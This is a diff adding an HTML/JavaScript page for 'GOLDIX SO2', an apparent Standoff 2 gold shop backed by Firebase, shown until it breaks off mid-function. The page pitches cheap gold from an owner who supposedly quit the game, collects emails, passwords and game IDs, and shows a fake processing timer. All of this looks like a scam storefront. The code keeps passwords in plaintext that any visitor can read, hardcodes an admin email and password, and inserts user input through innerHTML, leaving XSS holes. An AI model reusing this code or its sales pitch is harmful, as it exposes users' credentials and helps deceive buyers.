@@ -1,0 +1,1524 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOLDIX SO2</title>
+  <style>
+    :root {
+      --bg-color: #0d1117;
+      --card-bg: #161b22;
+      --accent: #ffb703;
+      --accent-hover: #ffa200;
+      --text: #ffffff;
+      --text-muted: #8b949e;
+      --danger: #f85149;
+      --success: #2ea043;
+      --border: #30363d;
+      --filter-brightness: brightness(100%);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-color);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      filter: var(--filter-brightness);
+      transition: filter 0.3s ease;
+      padding-bottom: 75px;
+    }
+
+    #app-container {
+      width: 100%;
+      max-width: 480px;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .modal {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.85);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      padding: 16px;
+    }
+
+    .modal-content {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+    }
+
+    .hidden { display: none !important; }
+
+    h1, h2, h3 { text-align: center; color: var(--accent); margin-bottom: 12px; }
+    p { color: var(--text-muted); font-size: 14px; line-height: 1.5; margin-bottom: 12px; }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      margin-bottom: 12px;
+    }
+    label { font-size: 12px; color: var(--text-muted); }
+    input, select, textarea {
+      background: #0d1117;
+      border: 1px solid var(--border);
+      color: #fff;
+      padding: 10px 14px;
+      border-radius: 8px;
+      outline: none;
+    }
+    input:focus { border-color: var(--accent); }
+
+    .btn {
+      background: var(--accent);
+      color: #000;
+      font-weight: bold;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.2s;
+    }
+    .btn:hover { background: var(--accent-hover); }
+    .btn-danger { background: var(--danger); color: #fff; }
+    .btn-secondary { background: #21262d; color: #fff; border: 1px solid var(--border); }
+
+    .top-header {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      padding: 12px 16px;
+      border-radius: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+    }
+    .logo { font-size: 18px; font-weight: bold; color: var(--accent); }
+
+    .verified-icon {
+      color: #2f81f7;
+      margin-left: 4px;
+      font-size: 14px;
+      vertical-align: middle;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #ffffff;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+      margin: 2px;
+    }
+    .badge-owner { background: linear-gradient(135deg, #ef4444, #dc2626); }
+    .badge-dev { background: linear-gradient(135deg, #8b5cf6, #6d28d9); }
+    .badge-creator { background: linear-gradient(135deg, #ec4899, #be185d); }
+    .badge-head-admin { background: linear-gradient(135deg, #22c55e, #15803d); }
+    .badge-admin { background: linear-gradient(135deg, #3b82f6, #1d4ed8); }
+    .badge-head-mod { background: linear-gradient(135deg, #a855f7, #7e22ce); }
+    .badge-mod { background: linear-gradient(135deg, #f43f5e, #be123c); }
+    .badge-order-mod { background: linear-gradient(135deg, #06b6d4, #0e7490); }
+    .badge-vip { background: linear-gradient(135deg, #eab308, #ca8a04); }
+    .badge-default { background: linear-gradient(135deg, #6b7280, #374151); }
+
+    .status-dot {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+    .status-online { background-color: var(--success); box-shadow: 0 0 6px var(--success); }
+    .status-offline { background-color: var(--text-muted); }
+
+    .gold-grid { display: flex; flex-direction: column; gap: 12px; }
+    .gold-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .gold-amount { font-size: 18px; font-weight: bold; color: var(--accent); }
+    .price-tag { font-size: 14px; color: var(--text); }
+    .old-price { text-decoration: line-through; color: var(--text-muted); font-size: 12px; margin-right: 4px; }
+
+    .bottom-nav {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: 60px;
+      background: var(--card-bg);
+      border-top: 1px solid var(--border);
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      z-index: 100;
+    }
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 10px;
+      color: var(--text-muted);
+      background: none;
+      border: none;
+      cursor: pointer;
+      gap: 4px;
+    }
+    .nav-item.active { color: var(--accent); }
+
+    .item-list { display: flex; flex-direction: column; gap: 8px; }
+    .list-item {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 13px;
+    }
+
+    .switch-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+    }
+
+    .auth-toggle {
+      text-align: center;
+      font-size: 13px;
+      color: var(--accent);
+      cursor: pointer;
+      margin-top: 12px;
+      text-decoration: underline;
+    }
+
+    /* Telegram Style Live Chat */
+    .chat-container-box {
+      display: flex;
+      flex-direction: column;
+      height: 420px;
+      background: #090d12;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+    }
+    .chat-header {
+      background: var(--card-bg);
+      padding: 10px 14px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .chat-messages {
+      flex: 1;
+      padding: 12px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .chat-bubble {
+      max-width: 80%;
+      padding: 8px 12px;
+      border-radius: 12px;
+      font-size: 13px;
+      position: relative;
+      word-wrap: break-word;
+    }
+    .chat-bubble.me {
+      align-self: flex-end;
+      background: #2b5278;
+      color: #fff;
+      border-bottom-right-radius: 2px;
+    }
+    .chat-bubble.other {
+      align-self: flex-start;
+      background: var(--card-bg);
+      color: #fff;
+      border-bottom-left-radius: 2px;
+      border: 1px solid var(--border);
+    }
+    .chat-sender {
+      font-size: 11px;
+      font-weight: bold;
+      color: var(--accent);
+      margin-bottom: 3px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .chat-media {
+      max-width: 100%;
+      border-radius: 8px;
+      margin-top: 4px;
+    }
+    .chat-time {
+      font-size: 9px;
+      color: rgba(255,255,255,0.6);
+      text-align: right;
+      margin-top: 2px;
+    }
+    .chat-controls {
+      background: var(--card-bg);
+      padding: 8px;
+      border-top: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .chat-input-row { display: flex; gap: 6px; align-items: center; }
+    .chat-btn-icon {
+      background: #21262d;
+      border: 1px solid var(--border);
+      color: #fff;
+      padding: 8px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+  </style>
+
+  <!-- Firebase SDKs -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, getDocs, addDoc, doc, updateDoc, deleteDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAfy0_Neq4rdBhMkDc9wRr27o7io9TJL6k",
+      authDomain: "goldix-so2.firebaseapp.com",
+      projectId: "goldix-so2",
+      storageBucket: "goldix-so2.firebasestorage.app",
+      messagingSenderId: "11196035523",
+      appId: "1:11196035523:web:ee22b4c98dbb4f6f7e0d76",
+      measurementId: "G-WR46Q5X2L1"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    window.db = db;
+    window.FB = { collection, getDocs, addDoc, doc, updateDoc, deleteDoc, setDoc };
+    window.dispatchEvent(new Event('firebase-ready'));
+  </script>
+</head>
+<body>
+
+  <!-- Auth Modal -->
+  <div id="auth-modal" class="modal">
+    <div class="modal-content">
+      <h2 id="auth-title">Вход GOLDIX SO2</h2>
+      <form id="auth-form">
+        <div class="form-group hidden" id="nick-group">
+          <label>Имя пользователя (Ник):</label>
+          <input type="text" id="reg-username" placeholder="Введите ваш ник">
+        </div>
+        <div class="form-group">
+          <label>Электронная почта:</label>
+          <input type="email" id="reg-email" required placeholder="example@mail.com">
+        </div>
+        <div class="form-group">
+          <label>Пароль:</label>
+          <input type="password" id="reg-password" required placeholder="••••••••">
+        </div>
+        <button type="submit" class="btn" id="auth-submit-btn">Войти</button>
+      </form>
+      <div class="auth-toggle" onclick="toggleAuthMode()" id="auth-toggle-btn">
+        Нет аккаунта? Зарегистрироваться
+      </div>
+    </div>
+  </div>
+
+  <!-- Info Modal -->
+  <div id="info-modal" class="modal hidden">
+    <div class="modal-content">
+      <h2>Почему именно мы?</h2>
+      <p>Я полностью закинул игру Standoff 2 и решил распродать свой личный баланс. У меня осталось более <b>380 000 голды</b>!</p>
+      <p>Продаю по самым низким и выгодным ценам на рынке. Успей забрать голду прямо сейчас!</p>
+      <button class="btn" onclick="goToShopFromInfo()">Перейти в магазин</button>
+    </div>
+  </div>
+
+  <!-- Purchase Modal -->
+  <div id="purchase-modal" class="modal hidden">
+    <div class="modal-content">
+      <h2>Запрос на покупку</h2>
+      <p id="purchase-item-name"></p>
+
+      <div id="purchase-form-step">
+        <div class="form-group">
+          <label>ID аккаунта в Standoff 2:</label>
+          <input type="text" id="purchase-standoff-id" placeholder="Например: 12345678" required>
+        </div>
+        <div class="form-group">
+          <label>Комментарий / Пожелания к заказу:</label>
+          <input type="text" id="purchase-note" placeholder="Необязательно">
+        </div>
+        <button class="btn" onclick="startPurchaseTimer()">Отправить запрос</button>
+        <button class="btn btn-secondary" onclick="closePurchaseModal()" style="margin-top: 8px;">Отмена</button>
+      </div>
+
+      <div id="purchase-timer-step" class="hidden">
+        <h3 id="timer-display">03:00</h3>
+        <p style="text-align: center;">Обработка запроса на покупку...</p>
+      </div>
+
+      <div id="purchase-result-step" class="hidden">
+        <p style="color: var(--success); text-align: center; font-weight: bold;">
+          Ваш запрос отправлен модерации проекта, ожидайте подтверждения в течение 24-х часов!
+        </p>
+        <button class="btn" onclick="closePurchaseModalCompletely()">Понятно</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Layout -->
+  <div id="app-container">
+    <div class="top-header">
+      <div class="logo">GOLDIX SO2</div>
+      <div id="user-display" style="font-size: 12px; color: var(--accent); font-weight: bold;"></div>
+    </div>
+
+    <!-- TAB 1: Shop -->
+    <div id="tab-shop" class="tab-content">
+      <h2>Магазин Голды</h2>
+      <div class="gold-grid" id="gold-items-container"></div>
+    </div>
+
+    <!-- TAB 2: Info -->
+    <div id="tab-info" class="tab-content hidden">
+      <h2>О проекте GOLDIX SO2</h2>
+      <div class="list-item">
+        <p>Приветствуем в магазине GOLDIX SO2! Здесь продается голда по самым честным ценам в связи с окончанием игровой карьеры владельца.</p>
+        <p><b>Остаток на балансе:</b> > 380,000 Gold</p>
+        <p><b>Гарантия:</b> Проверка и одобрение заказов модерацией проекта в течение 24 часов.</p>
+      </div>
+    </div>
+
+    <!-- TAB 3: My Orders -->
+    <div id="tab-orders" class="tab-content hidden">
+      <h2>Мои заказы</h2>
+      <div id="my-orders-list" class="item-list"></div>
+    </div>
+
+    <!-- TAB 4: Inbox & Telegram-Style Chat -->
+    <div id="tab-inbox" class="tab-content hidden">
+      <h2>Входящие и Чат</h2>
+      
+      <div id="chat-container" class="hidden">
+        <div class="chat-container-box">
+          <div class="chat-header">
+            <div>
+              <b id="chat-with-title">Чат с поддержкой</b>
+              <div id="chat-online-status" style="font-size:10px; color: var(--text-muted);">
+                <span class="status-dot status-online"></span>В сети
+              </div>
+            </div>
+          </div>
+          <div class="chat-messages" id="chat-messages"></div>
+          <div class="chat-controls">
+            <div id="chat-media-preview" class="hidden" style="font-size:11px; color: var(--accent); margin-bottom: 4px;">
+              📎 Вложение готово к отправке
+            </div>
+            <div class="chat-input-row">
+              <button class="chat-btn-icon" onclick="document.getElementById('chat-file-input').click()">📎</button>
+              <button class="chat-btn-icon" id="record-voice-btn" onclick="toggleVoiceRecord()">🎙️</button>
+              <input type="file" id="chat-file-input" accept="image/*,video/*" class="hidden" onchange="handleFileSelect(event)">
+              <input type="text" id="chat-input" placeholder="Напишите сообщение..." style="flex:1;">
+              <button class="btn" onclick="sendChatMessage()" style="width: auto; padding: 0 16px;">➤</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="admin-chats-selector" class="hidden" style="margin-bottom: 12px;">
+        <h3>Диалоги с покупателями</h3>
+        <div id="admin-chats-list" class="item-list"></div>
+      </div>
+
+      <div id="inbox-list" class="item-list" style="margin-top: 12px;"></div>
+    </div>
+
+    <!-- TAB 5: Online Users -->
+    <div id="tab-users" class="tab-content hidden">
+      <h2>Пользователи</h2>
+      <div id="users-online-list" class="item-list"></div>
+    </div>
+
+    <!-- TAB 6: Profile -->
+    <div id="tab-profile" class="tab-content hidden">
+      <h2>Мой профиль</h2>
+      <div class="list-item" style="margin-bottom: 12px;">
+        <p><b>Никнейм:</b> <span id="profile-nick">-</span> <span id="profile-verified"></span></p>
+        <p><b>Почта:</b> <span id="profile-email">-</span></p>
+        <p><b>ID Standoff:</b> <span id="profile-standoff-id">Не указан</span></p>
+        <div style="margin-top: 6px;">
+          <b>Звания и Медали:</b>
+          <div id="profile-medals" style="margin-top: 4px;"></div>
+        </div>
+      </div>
+      
+      <div style="display: flex; flex-direction: column; gap: 8px;">
+        <button class="btn btn-secondary" id="admin-panel-btn" style="display: none;" onclick="openAdminPanel()">
+          ⚙️ Панель Управления
+        </button>
+        <button class="btn btn-danger" onclick="logoutUser()">
+          🚪 Выйти из аккаунта
+        </button>
+      </div>
+    </div>
+
+    <!-- TAB 7: Settings -->
+    <div id="tab-settings" class="tab-content hidden">
+      <h2>Настройки</h2>
+      <div class="list-item" style="display: flex; flex-direction: column; gap: 10px;">
+        <button class="btn btn-secondary" onclick="saveStandoffId()">Добавить / изменить ID Standoff 2</button>
+        <button class="btn btn-secondary" onclick="changeEmail()">Изменить почту</button>
+        <button class="btn btn-secondary" onclick="changePassword()">Изменить пароль</button>
+        <button class="btn btn-secondary" onclick="cancelMyPendingOrders()">Отклонить все свои активные заказы</button>
+        
+        <div class="switch-row">
+          <span>Увеличенная яркость сайта</span>
+          <input type="checkbox" id="brightness-toggle" onchange="toggleBrightness()">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Admin Modal -->
+  <div id="admin-modal" class="modal hidden">
+    <div class="modal-content" style="max-width: 500px; max-height: 90vh; overflow-y: auto;">
+      <h2>Панель Модерации</h2>
+      
+      <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px;">
+        <button class="btn btn-danger" onclick="adminClearOrders()">Очистить список заказов</button>
+        <button class="btn btn-danger" onclick="adminRejectAll()">Отклонить все заказы</button>
+        <button class="btn" onclick="adminApproveAll()">Одобрить все заказы</button>
+        
+        <div class="switch-row" style="background: #0d1117; padding: 10px; border-radius: 8px;">
+          <span>Скидки 25% на весь магазин</span>
+          <input type="checkbox" id="admin-discount-toggle" onchange="toggleGlobalDiscount()">
+        </div>
+      </div>
+
+      <h3>Заказы</h3>
+      <div id="admin-orders-list" class="item-list" style="margin-bottom: 16px;"></div>
+
+      <h3>Управление Пользователями и Ролями</h3>
+      <div id="admin-users-list" class="item-list"></div>
+
+      <button class="btn btn-secondary" onclick="closeAdminPanel()" style="margin-top: 16px;">Закрыть</button>
+    </div>
+  </div>
+
+  <!-- Bottom Nav -->
+  <div class="bottom-nav">
+    <button class="nav-item" onclick="switchTab('info')">
+      <span>ℹ️</span> Инфо
+    </button>
+    <button class="nav-item active" onclick="switchTab('shop')">
+      <span>🛒</span> Магазин
+    </button>
+    <button class="nav-item" onclick="switchTab('orders')">
+      <span>📦</span> Заказы
+    </button>
+    <button class="nav-item" onclick="switchTab('inbox')">
+      <span>📩</span> Чат
+    </button>
+    <button class="nav-item" onclick="switchTab('users')">
+      <span>👥</span> Сеть
+    </button>
+    <button class="nav-item" onclick="switchTab('profile')">
+      <span>👤</span> Профиль
+    </button>
+    <button class="nav-item" onclick="switchTab('settings')">
+      <span>⚙️</span> Настройки
+    </button>
+  </div>
+
+  <script>
+    let currentUser = null;
+    let selectedPackage = null;
+    let timerInterval = null;
+    let globalDiscount = false;
+    let isLoginMode = true;
+    let activeChatEmail = null;
+    let pendingAttachment = null;
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let isRecording = false;
+
+    let users = [];
+    let orders = [];
+    let chats = [];
+
+    const availableRoles = [
+      { name: 'Владелец', class: 'badge-owner' },
+      { name: 'Разработчик web', class: 'badge-dev' },
+      { name: 'Создатель', class: 'badge-creator' },
+      { name: 'Главный Модератор сайта', class: 'badge-head-admin' },
+      { name: 'Модератор сайта', class: 'badge-admin' },
+      { name: 'Куратор модерации', class: 'badge-head-mod' },
+      { name: 'Модератор по заказам', class: 'badge-order-mod' },
+      { name: 'Модератор', class: 'badge-mod' },
+      { name: 'VIP', class: 'badge-vip' },
+      { name: 'Улучшеный пользователь', class: 'badge-default' },
+      { name: 'Пользователь', class: 'badge-default' }
+    ];
+
+    const shopPackages = [
+      { id: 1, gold: 500, rub: 100, uah: 50 },
+      { id: 2, gold: 1000, rub: 150, uah: 75 },
+      { id: 3, gold: 2000, rub: 200, uah: 100 },
+      { id: 4, gold: 3000, rub: 300, uah: 150 },
+      { id: 5, gold: 5000, rub: 400, uah: 200 }
+    ];
+
+    window.addEventListener('firebase-ready', () => {
+      fetchData();
+      applyBrightness();
+      setInterval(fetchData, 4000);
+    });
+
+    async function fetchData() {
+      if (!window.db) return;
+      try {
+        const { collection, getDocs, addDoc } = window.FB;
+
+        // 1. Загружаем пользователей
+        const usersSnap = await getDocs(collection(window.db, 'users'));
+        users = usersSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+
+        // Авто-создание главного админа, если его нет
+        const adminEmail = 'samp111517@gmail.com';
+        if (!users.some(u => u.email === adminEmail)) {
+          await addDoc(collection(window.db, 'users'), {
+            username: 'Admins',
+            email: adminEmail,
+            password: 'Nazik_111517',
+            standoffId: '171717',
+            verified: true,
+            lastSeen: Date.now(),
+            medals: ['Владелец', 'Разработчик web', 'Создатель', 'Модератор сайта', 'Главный Модератор сайта', 'Куратор модерации']
+          });
+          const updatedSnap = await getDocs(collection(window.db, 'users'));
+          users = updatedSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+        }
+
+        // 2. Загружаем заказы
+        const ordersSnap = await getDocs(collection(window.db, 'orders'));
+        orders = ordersSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+
+        // 3. Загружаем чаты
+        const chatsSnap = await getDocs(collection(window.db, 'chats'));
+        chats = chatsSnap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+
+        if (currentUser) {
+          currentUser = users.find(u => u.email === currentUser.email) || currentUser;
+          updateProfileUI();
+        }
+
+        renderShopItems();
+        renderOrders();
+        renderUsersOnlineTab();
+        if (activeChatEmail) renderChatMessages(activeChatEmail);
+      } catch (e) {
+        console.error('Ошибка загрузки Firebase:', e);
+      }
+    }
+
+    function isUserOnline(lastSeen) {
+      return lastSeen && (Date.now() - lastSeen < 45000);
+    }
+
+    function toggleAuthMode() {
+      isLoginMode = !isLoginMode;
+      const title = document.getElementById('auth-title');
+      const submitBtn = document.getElementById('auth-submit-btn');
+      const toggleBtn = document.getElementById('auth-toggle-btn');
+      const nickGroup = document.getElementById('nick-group');
+
+      if (isLoginMode) {
+        title.innerText = "Вход GOLDIX SO2";
+        submitBtn.innerText = "Войти";
+        toggleBtn.innerText = "Нет аккаунта? Зарегистрироваться";
+        nickGroup.classList.add('hidden');
+      } else {
+        title.innerText = "Регистрация GOLDIX SO2";
+        submitBtn.innerText = "Зарегистрироваться";
+        toggleBtn.innerText = "Уже есть аккаунт? Войти";
+        nickGroup.classList.remove('hidden');
+      }
+    }
+
+    document.getElementById('auth-form').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const email = document.getElementById('reg-email').value.trim();
+      const password = document.getElementById('reg-password').value.trim();
+
+      if (isLoginMode) {
+        let user = users.find(u => u.email === email && u.password === password);
+        if (user) {
+          currentUser = user;
+          const { doc, updateDoc } = window.FB;
+          await updateDoc(doc(window.db, 'users', currentUser.id), { lastSeen: Date.now() });
+          document.getElementById('auth-modal').classList.add('hidden');
+          updateProfileUI();
+          fetchData();
+        } else {
+          alert('Неверный email или пароль!');
+        }
+      } else {
+        const username = document.getElementById('reg-username').value.trim();
+        if (!username) {
+          alert('Введите ваш никнейм!');
+          return;
+        }
+
+        if (users.some(u => u.email === email)) {
+          alert('Пользователь с такой почтой уже существует!');
+          return;
+        }
+
+        const newUser = {
+          username,
+          email,
+          password,
+          standoffId: '',
+          verified: false,
+          lastSeen: Date.now(),
+          medals: ['Пользователь']
+        };
+
+        const { collection, addDoc } = window.FB;
+        const docRef = await addDoc(collection(window.db, 'users'), newUser);
+        currentUser = { id: docRef.id, ...newUser };
+
+        document.getElementById('auth-modal').classList.add('hidden');
+        document.getElementById('info-modal').classList.remove('hidden');
+        updateProfileUI();
+        fetchData();
+      }
+    });
+
+    function logoutUser() {
+      currentUser = null;
+      document.getElementById('auth-modal').classList.remove('hidden');
+      switchTab('shop');
+    }
+
+    function goToShopFromInfo() {
+      document.getElementById('info-modal').classList.add('hidden');
+      switchTab('shop');
+    }
+
+    function switchTab(tabName) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+      document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+
+      const targetTab = document.getElementById('tab-' + tabName);
+      if (targetTab) targetTab.classList.remove('hidden');
+
+      const activeBtn = Array.from(document.querySelectorAll('.nav-item')).find(btn => 
+        btn.textContent.toLowerCase().includes(
+          tabName === 'shop' ? 'магазин' : 
+          tabName === 'info' ? 'инфо' : 
+          tabName === 'orders' ? 'заказы' : 
+          tabName === 'inbox' ? 'чат' : 
+          tabName === 'users' ? 'сеть' :
+          tabName === 'profile' ? 'профиль' : 'настройки'
+        )
+      );
+      if (activeBtn) activeBtn.classList.add('active');
+
+      if (tabName === 'orders') renderOrders();
+      if (tabName === 'inbox') renderInboxTab();
+      if (tabName === 'users') renderUsersOnlineTab();
+    }
+
+    function renderShopItems() {
+      const container = document.getElementById('gold-items-container');
+      container.innerHTML = '';
+
+      shopPackages.forEach(pkg => {
+        let finalRub = pkg.rub;
+        let finalUah = pkg.uah;
+
+        if (globalDiscount) {
+          finalRub = Math.round(pkg.rub * 0.75);
+          finalUah = Math.round(pkg.uah * 0.75);
+        }
+
+        const card = document.createElement('div');
+        card.className = 'gold-card';
+        card.innerHTML = `
+          <div>
+            <div class="gold-amount">${pkg.gold} Голды</div>
+            <div class="price-tag">
+              ${globalDiscount ? `<span class="old-price">${pkg.rub}₽ / ${pkg.uah}грн</span>` : ''}
+              <b>${finalRub} рублей / ${finalUah} грн</b>
+            </div>
+          </div>
+          <button class="btn" style="width: auto; padding: 8px 16px;" onclick="openPurchaseModal(${pkg.id})">Купить</button>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    function openPurchaseModal(pkgId) {
+      if (!currentUser) return;
+      selectedPackage = shopPackages.find(p => p.id === pkgId);
+      document.getElementById('purchase-item-name').innerText = `Товар: ${selectedPackage.gold} Голды`;
+      document.getElementById('purchase-standoff-id').value = currentUser.standoffId || '';
+      
+      document.getElementById('purchase-form-step').classList.remove('hidden');
+      document.getElementById('purchase-timer-step').classList.add('hidden');
+      document.getElementById('purchase-result-step').classList.add('hidden');
+      document.getElementById('purchase-modal').classList.remove('hidden');
+    }
+
+    function closePurchaseModal() {
+      document.getElementById('purchase-modal').classList.add('hidden');
+      if (timerInterval) clearInterval(timerInterval);
+    }
+
+    function closePurchaseModalCompletely() {
+      closePurchaseModal();
+      switchTab('orders');
+    }
+
+    async function startPurchaseTimer() {
+      const standoffId = document.getElementById('purchase-standoff-id').value.trim();
+      const note = document.getElementById('purchase-note').value.trim();
+
+      if (!standoffId) {
+        alert('Пожалуйста, укажите ваш ID в Standoff 2!');
+        return;
+      }
+
+      currentUser.standoffId = standoffId;
+      const { doc, updateDoc } = window.FB;
+      await updateDoc(doc(window.db, 'users', currentUser.id), { standoffId });
+
+      document.getElementById('purchase-form-step').classList.add('hidden');
+      document.getElementById('purchase-timer-step').classList.remove('hidden');
+
+      let timeLeft = 180;
+      const timerDisplay = document.getElementById('timer-display');
+
+      timerInterval = setInterval(async () => {
+        timeLeft--;
+        const min = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+        const sec = (timeLeft % 60).toString().padStart(2, '0');
+        timerDisplay.innerText = `${min}:${sec}`;
+
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          
+          let finalRub = selectedPackage.rub;
+          if (globalDiscount) finalRub = Math.round(selectedPackage.rub * 0.75);
+
+          const newOrder = {
+            userEmail: currentUser.email,
+            userNick: currentUser.username,
+            standoffId: standoffId,
+            gold: selectedPackage.gold,
+            price: finalRub,
+            note: note,
+            status: 'В обработке',
+            createdAt: Date.now()
+          };
+
+          const { collection, addDoc } = window.FB;
+          await addDoc(collection(window.db, 'orders'), newOrder);
+
+          document.getElementById('purchase-timer-step').classList.add('hidden');
+          document.getElementById('purchase-result-step').classList.remove('hidden');
+          fetchData();
+        }
+      }, 1000);
+    }
+
+    function renderOrders() {
+      const container = document.getElementById('my-orders-list');
+      container.innerHTML = '';
+      
+      const myOrders = orders.filter(o => o.userEmail === currentUser.email);
+      if (myOrders.length === 0) {
+        container.innerHTML = '<p>У вас пока нет заказов.</p>';
+        return;
+      }
+
+      myOrders.forEach(o => {
+        const item = document.createElement('div');
+        item.className = 'list-item';
+        let badgeClass = o.status === 'Одобрен' ? 'badge-head-admin' : o.status === 'Отклонен' ? 'badge-owner' : 'badge-vip';
+        item.innerHTML = `
+          <div style="display:flex; justify-content:space-between; margin-bottom: 4px;">
+            <b>${o.gold} Голды (${o.price}₽)</b>
+            <span class="badge ${badgeClass}">${o.status}</span>
+          </div>
+          <p style="margin:0; font-size:12px;">Standoff ID: ${o.standoffId}</p>
+        `;
+        container.appendChild(item);
+      });
+    }
+
+    function renderInboxTab() {
+      const chatContainer = document.getElementById('chat-container');
+      const adminSelector = document.getElementById('admin-chats-selector');
+      const isStaff = hasStaffRole(currentUser);
+
+      if (isStaff) {
+        adminSelector.classList.remove('hidden');
+        renderAdminChatsList();
+        if (activeChatEmail) {
+          chatContainer.classList.remove('hidden');
+          renderChatMessages(activeChatEmail);
+        } else {
+          chatContainer.classList.add('hidden');
+        }
+      } else {
+        adminSelector.classList.add('hidden');
+        const hasApprovedOrder = orders.some(o => o.userEmail === currentUser.email && o.status === 'Одобрен');
+        if (hasApprovedOrder) {
+          activeChatEmail = currentUser.email;
+          chatContainer.classList.remove('hidden');
+          renderChatMessages(currentUser.email);
+        } else {
+          chatContainer.classList.add('hidden');
+        }
+      }
+    }
+
+    function renderAdminChatsList() {
+      const container = document.getElementById('admin-chats-list');
+      container.innerHTML = '';
+
+      const activeChatEmails = [...new Set(chats.map(c => c.chatEmail))];
+      if (activeChatEmails.length === 0) {
+        container.innerHTML = '<p style="font-size:12px;">Активных диалогов нет.</p>';
+        return;
+      }
+
+      activeChatEmails.forEach(email => {
+        const targetUser = users.find(u => u.email === email);
+        const name = targetUser ? targetUser.username : email;
+        const item = document.createElement('div');
+        item.className = 'list-item';
+        item.style.cursor = 'pointer';
+        item.style.borderLeft = activeChatEmail === email ? '4px solid var(--accent)' : '1px solid var(--border)';
+        item.innerHTML = `<b>${name}</b> (${email}) ${targetUser?.verified ? '<span class="verified-icon">☑</span>' : ''}`;
+        item.onclick = () => {
+          activeChatEmail = email;
+          renderInboxTab();
+        };
+        container.appendChild(item);
+      });
+    }
+
+    function renderChatMessages(chatEmail) {
+      const box = document.getElementById('chat-messages');
+      box.innerHTML = '';
+      const targetUser = users.find(u => u.email === chatEmail);
+      
+      document.getElementById('chat-with-title').innerText = targetUser ? `Чат с ${targetUser.username}` : `Чат (${chatEmail})`;
+      
+      const onlineStatusEl = document.getElementById('chat-online-status');
+      const online = targetUser ? isUserOnline(targetUser.lastSeen) : false;
+      onlineStatusEl.innerHTML = `<span class="status-dot ${online ? 'status-online' : 'status-offline'}"></span>${online ? 'В сети' : 'Был(а) недавно'}`;
+
+      const chatDoc = chats.find(c => c.chatEmail === chatEmail);
+      const msgs = chatDoc && chatDoc.messages ? chatDoc.messages : [];
+
+      msgs.forEach(m => {
+        const div = document.createElement('div');
+        const isMe = m.sender === currentUser.email;
+        div.className = `chat-bubble ${isMe ? 'me' : 'other'}`;
+        
+        let mediaHtml = '';
+        if (m.mediaType === 'image') {
+          mediaHtml = `<img src="${m.mediaUrl}" class="chat-media">`;
+        } else if (m.mediaType === 'video') {
+          mediaHtml = `<video src="${m.mediaUrl}" controls class="chat-media"></video>`;
+        } else if (m.mediaType === 'audio') {
+          mediaHtml = `<audio src="${m.mediaUrl}" controls style="width:100%; margin-top:4px;"></audio>`;
+        }
+
+        const verifiedTag = m.senderVerified ? '<span class="verified-icon">☑</span>' : '';
+
+        div.innerHTML = `
+          <div class="chat-sender">${m.senderName} ${verifiedTag}</div>
